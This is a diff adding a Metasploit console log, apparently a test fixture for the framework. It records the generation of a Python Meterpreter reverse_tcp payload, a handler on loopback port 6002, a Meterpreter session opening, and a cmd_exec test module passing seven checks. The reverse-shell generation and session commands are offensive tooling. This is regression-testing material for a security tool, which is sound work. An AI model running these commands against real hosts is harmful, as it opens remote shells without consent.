@@ -1,0 +1,46 @@
+use python/meterpreter/reverse_tcp
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-3416-bpaa5i.py -f raw AutoVerifySessionTimeout=10 MeterpreterTryToFork=false PythonMeterpreterDebug=true lport=6002 lhost=127.0.0.1
+[*] Writing 493 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220204-3416-bpaa5i.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 1
+[4mmsf6[0m payload([1m[31mpython/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6002 
+[*] Sending stage (39800 bytes) to 127.0.0.1
+[*] Meterpreter session 2 opened (127.0.0.1:6002 -> 127.0.0.1:49519 ) at 2022-02-04 02:58:08 +0000
+use test/cmd_exec
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> run session=2 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[*] Running against session 2
+[*] Session type is meterpreter and platform is osx
+[*] Starting cmd_exec quote tests
+before running test: should return the result of echo with single quotes
+expected: HDpD - [72, 68, 112, 68] - ASCII-8BIT
+actual: HDpD - [72, 68, 112, 68] - ASCII-8BIT
+[+] should return the result of echo with single quotes
+before running test: should return the result of echo with double quotes
+expected: zpwj - [122, 112, 119, 106] - ASCII-8BIT
+actual: zpwj - [122, 112, 119, 106] - ASCII-8BIT
+[+] should return the result of echo with double quotes
+[*] Starting cmd_exec stderr tests
+before running test: should return the stderr output
+expected: lpYK - [108, 112, 89, 75] - ASCII-8BIT
+actual: lpYK - [108, 112, 89, 75] - ASCII-8BIT
+[+] should return the stderr output
+[*] Starting cmd_exec tests
+before running test: should return the result of echo
+expected: fFbu - [102, 70, 98, 117] - ASCII-8BIT
+actual: fFbu - [102, 70, 98, 117] - ASCII-8BIT
+[+] should return the result of echo
+before running test: should return the full response after sleeping
+[+] should return the full response after sleeping
+before running test: should return the full response after sleeping
+[+] should return the full response after sleeping
+before running test: should return the result of echo 10 times
+[+] should return the result of echo 10 times
+[*] Finished cmd_exec tests
+[*] Testing complete in 7.449161
+[*] Passed: 7; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> 
